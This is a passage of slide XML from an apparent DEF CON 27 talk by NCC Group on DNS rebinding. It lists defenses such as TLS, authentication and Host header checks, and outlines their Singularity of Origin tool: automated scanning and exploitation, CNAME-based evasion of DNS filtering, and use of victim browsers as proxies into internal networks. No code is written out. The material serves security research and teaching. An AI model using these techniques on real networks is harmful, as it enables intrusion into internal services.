              <a:t>And no, DNSSec does not help at all!</a:t>
            </a:r>
            <a:endParaRPr i="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="634" name="Google Shape;634;p85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1976100" y="1017725"/>
            <a:ext cx="5191800" cy="3292800"/>
          </a:xfrm>
          <a:prstGeom prst="mathMultiply">
            <a:avLst>
              <a:gd fmla="val 23520" name="adj1"/>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38" name="Shape 638"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="639" name="Google Shape;639;p8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Really Protect From DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="640" name="Google Shape;640;p8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TLS on all services, external and internal including localhost (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://blog.filippo.io/mkcert-valid-https-certificates-for-localhost/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://github.com/FiloSottile/mkcert/releases</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Always use authentication.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Validate the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Host</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> header of HTTP requests for correct values e.g. 127.0.0.1 (whitelisting).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>The future?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://wicg.github.io/cors-rfc1918/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>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44" name="Shape 644"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="645" name="Google Shape;645;p8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 3: Automation</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="646" name="Google Shape;646;p87">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2733225" y="1092200"/>
            <a:ext cx="6254048" cy="3517898"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="647" name="Google Shape;647;p87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1152475"/>
            <a:ext cx="2421600" cy="3416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t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Arial"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Portscan</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Rebind in 3s</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Auto-detect services</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Exploit</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51" name="Shape 651"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="652" name="Google Shape;652;p8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
        <p:nvSpPr>
          <p:cNvPr id="653" name="Google Shape;653;p8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Get the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Slides</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Notes at: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://bit.ly/Singularity_Defcon27</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Get Singularity of Origin at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://github.com/nccgroup/singularity</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>DNS server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> to rebind DNS names to IP addresses</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>HTTP server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> to serve HTML pages and JavaScript code to targets and to manage the attacks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Sample attack payloads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Chrome DevTools, Jenkins, &amp; many more</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Supports DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>CNAME </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>to evade DNS filtering solutions</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>A simple, fast and efficient </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>HTTP port scanner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> to identify vulnerable services</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Attack automation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: completely automate the scanning and exploitation</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Hook &amp; control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> to exploit victim browser as HTTP proxy to access internal </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>network resources</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Contact us:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>gerald.doussot@nccgroup.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>roger.meyer@nccgroup.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="654" name="Google Shape;654;p88"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7483675" y="3626675"/>
            <a:ext cx="1531857" cy="1417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